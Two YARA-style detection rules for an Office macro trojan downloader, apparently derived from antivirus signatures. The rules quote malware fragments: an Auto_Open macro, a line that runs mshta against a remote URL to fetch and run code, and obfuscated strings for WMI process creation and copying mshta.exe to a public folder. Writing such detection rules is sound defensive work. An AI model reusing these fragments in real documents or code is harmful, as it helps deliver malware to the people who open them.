
rule TrojanDownloader_O97M_Donoff_MSR{
	meta:
		description = "TrojanDownloader:O97M/Donoff!MSR,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {50 75 62 6c 69 63 20 53 75 62 20 41 75 74 6f 5f 4f 70 65 6e } //1 Public Sub Auto_Open
		$a_01_1 = {76 61 72 30 20 3d 20 22 6d 73 48 54 61 20 68 74 74 70 73 3a 2f 2f 70 70 61 6d 2e 73 73 6c 62 6c 69 6e 64 61 64 6f 2e 63 6f 6d 2f 70 61 6e 64 65 2e 68 74 6d 6c 22 } //1 var0 = "msHTa https://ppam.sslblindado.com/pande.html"
		$a_01_2 = {56 61 52 20 3d 20 76 61 72 30 } //1 VaR = var0
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Donoff_MSR_2{
	meta:
		description = "TrojanDownloader:O97M/Donoff!MSR,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_00_0 = {73 73 65 29 63 6f 72 29 50 5f 32 29 33 6e 69 29 57 3a 32 29 76 6d 69 29 63 5c 74 29 6f 6f 72 29 3a 73 74 29 6d 67 6d 29 6e 69 77 } //1 sse)cor)P_2)3ni)W:2)vmi)c\t)oor):st)mgm)niw
		$a_00_1 = {6c 29 6d 29 74 29 68 29 2e 29 73 29 6d 29 5c 29 63 29 69 29 6c 29 62 29 75 29 70 29 5c 29 73 29 72 29 65 29 73 29 75 29 5c 29 3a 29 43 29 7c 29 6d 29 6f 29 63 29 2e 29 73 29 6d 29 5c 29 63 29 69 29 6c 29 62 29 75 29 70 29 5c 29 73 29 72 29 65 29 73 29 75 29 5c 29 3a 29 43 29 7c 29 65 29 78 29 65 29 2e 29 61 29 74 29 68 29 73 29 6d 29 5c 29 32 29 33 29 6d 29 65 29 74 29 73 29 79 29 73 29 5c 29 73 29 77 29 6f 29 64 29 6e 29 69 29 77 29 5c 29 3a 29 63 29 } //1 l)m)t)h).)s)m)\)c)i)l)b)u)p)\)s)r)e)s)u)\):)C)|)m)o)c).)s)m)\)c)i)l)b)u)p)\)s)r)e)s)u)\):)C)|)e)x)e).)a)t)h)s)m)\)2)3)m)e)t)s)y)s)\)s)w)o)d)n)i)w)\):)c)
	condition:
		((#a_00_0  & 1)*1+(#a_00_1  & 1)*1) >=2
 
}